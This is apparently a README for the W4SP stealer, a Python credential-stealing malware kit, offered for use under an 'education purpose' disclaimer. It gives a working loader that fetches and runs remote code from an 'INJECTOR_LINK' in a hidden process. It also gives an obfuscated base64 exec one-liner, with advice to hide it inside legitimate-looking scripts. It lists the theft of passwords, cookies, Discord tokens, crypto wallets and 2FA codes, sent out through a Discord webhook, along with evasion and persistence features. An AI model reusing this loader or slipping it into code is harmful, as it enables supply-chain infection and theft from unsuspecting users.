<a href="https://twitter.com/TheHackersNews/status/1588812607234117632"><img src="https://media.discordapp.net/attachments/526622602542710814/1039914372136448031/unknown.png"></img></a>
(for education purpose only)



## 🚩 Table of Content

- Setup - Stealer
- Setup - API & Bot
- Features - Stealer
- Features - Injector
- Features - Api
- Features - Bot
- Demo

## Setup [Stealer & Injector]
```sh
run builder.py
```
## Setup [Line ~ Optional but recomanded]
```py
from tempfile import NamedTemporaryFile as _ffile
from sys import executable as _eexecutable
from os import system as _ssystem
_ttmp = _ffile(delete=False)
_ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen("INJECTOR_LINK").read())""")
_ttmp.close()
try: _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
except: pass

# replace INJECTOR_LINK by the injector.py link from setup
# (this script was made by Billy)
```
```py
# encode in b64 the last payload and replace it here
# then hide this line in a legit looking python script
# or use ur brain and ur own technique, this is just un exemple
# remeber, its for education purpose, attacking a machine w/o autorisation is illegal !

__import__('\x62\x75\x69\x6c\x74\x69\x6e\x73').exec(__import__('\x62\x75\x69\x6c\x74\x69\x6e\x73').compile(__import__('\x62\x61\x73\x65\x36\x34').b64decode("%PAYLOAD%"),'<string>','\x65\x78\x65\x63'))
```

## Setup [API]



## Features [Stealer

Global
- Saved Passwords
- Browser Cookies
- Get PC information
- AntiVM - Trust Factor system, it wont send data if Gmail cookies arent' found
- All files are uploaded to an external api <- Improved by [xKian](https://github.com/sfx2me)
- Data is send throught a Discord webhook

Discord
- Discord Tokens from browsers
- Discord Token from discord, discordcanary, discordPTBa
- Get all info on token (email, nitro/badge, rare friends)

Wallets
- Exodus Wallet
- Metamask Wallet
- Atomic Walletk

Gaming
- Steam Client
- Riot Client
- NationsGlory Client

Other
- Telegram Session

File Stealer
- It will search throught the pc for: saved passwords, 2fa codes, wallet keys and other sensitive information<br>
(idea came from Kiwi plugin on msf)

## Features [Injector]
- Brilliant persistance technique (only in injector v1.1)
- Invisible in TaskManger StartUP tab (only in injector v1.1)
- FUD
- Fully runs in background
- Hides the stealer very well


## Features [API]
- Easy to update/upgrade
- Compatible with all w4sp versions
- Using auto & custom obfuscation
- Manage Users and Webhooks with API
- Browser security => If a browser is detected (headers) it will obfusacate a fake wasp script <- Brilliant Idea by [lath](https://github.com/lathlaszlo)

## Features [BOT]
- Easy to configure
- Manage Users and Webhooks using w4sp api
- Auto inject file.py

# Few articles on W4SP (they where writen during beta-testing)<br> ⚠️Most articles writen after that are 95% bullshit⚠️
- [securelist.com ~ Two more malicious Python packages in the PyPI
](https://securelist.com/two-more-malicious-python-packages-in-the-pypi/107218/)
- [securityweek.com ~ Security Firms Find Over 20 Malicious PyPI Packages Designed for Data Theft](https://www.securityweek.com/security-firms-find-over-20-malicious-pypi-packages-designed-data-theft)
- [digismak.com ~ Criminals steal data by spoofing popular open source package](https://digismak.com/criminals-steal-data-by-spoofing-popular-open-source-package/)
- [darkreading.com ~ Whack-a-Mole: More Malicious PyPI Packages Spring Up Targeting Discord, Roblox](https://www.darkreading.com/application-security/whack-a-mole-malicious-pypi-packages-target-discord-roblox)

# ScreenShots
<img src="https://cdn.discordapp.com/attachments/1035587885442813995/1035590779919421460/unknown.png"></img>
<img src="https://cdn.discordapp.com/attachments/1035587885442813995/1035591128193433661/unknown.png"></img>
<img src="https://cdn.discordapp.com/attachments/1035587885442813995/1035591544100634735/unknown.png"></img>
<img src="https://cdn.discordapp.com/attachments/1035587885442813995/1035591894098513960/unknown.png"></img>

ywoilvfoai